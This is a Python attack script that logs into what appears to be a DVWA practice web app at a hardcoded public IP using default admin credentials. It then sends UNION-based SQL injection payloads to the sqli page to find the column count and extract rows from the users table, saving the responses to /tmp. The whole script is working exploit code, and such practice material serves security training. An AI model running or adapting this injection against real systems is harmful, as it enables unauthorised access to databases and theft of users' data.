
import requests
import re
import urllib.parse

url = "http://31.97.117.123/"
session = requests.Session()

# Login first
response = session.get(f"{url}login.php")
token_match = re.search(r"user_token'\s+value='([a-f0-9]+)'", response.text)
csrf_token = token_match.group(1)

login_data = {
    "username": "admin",
    "password": "password",
    "user_token": csrf_token,
    "Login": "Login"
}

session.post(f"{url}login.php", data=login_data)

print("[*] Determining the number of columns...")

# Try to find how many columns are displayed
for num_cols in range(1, 10):
    payload = "1' UNION SELECT " + ", ".join([str(i) for i in range(1, num_cols + 1)]) + " FROM users WHERE '1'='1"
    encoded_payload = urllib.parse.quote(payload)
    
    response = session.get(f"{url}vulnerabilities/sqli/?id={encoded_payload}&Submit=Submit")
    
    if "The used SELECT statements have a different number of columns" not in response.text:
        print(f"\n[+] Found correct column count: {num_cols}")
        print(f"Response length: {len(response.text)}")
        if len(response.text) > 100:
            # Save this response
            with open(f"/tmp/sqli_response_{num_cols}.html", "w") as f:
                f.write(response.text)
            print(f"Response saved to /tmp/sqli_response_{num_cols}.html")
            
            # Try to extract user data with the correct number of columns
            if "ID:" in response.text:
                print("[+] Found 'ID:' in response - users are being displayed")
                # Get a sample
                id_match = re.search(r'ID:\s*(\d+)', response.text)
                if id_match:
                    print(f"First user ID: {id_match.group(1)}")
        break
    else:
        print(f"[-] {num_cols} columns: error")

